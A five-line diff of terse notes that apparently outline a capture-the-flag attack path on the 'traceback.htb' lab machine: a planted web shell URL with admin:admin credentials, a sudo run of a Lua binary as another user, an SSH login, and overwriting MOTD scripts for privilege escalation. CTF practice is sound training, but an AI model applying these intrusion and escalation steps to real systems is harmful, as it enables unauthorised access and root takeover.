@@ -1,0 +1,5 @@
+http://traceback.htb/smevk.php admin:admin
+sudo -u sysadmin /home/sysadmin/luvit corona
+> ssh sysadmin@traceback.htb
+> overwrite /etc/update-motd.d/91-release-upgrade
+> overwrite /etc/update-motd.d/50-motd-news
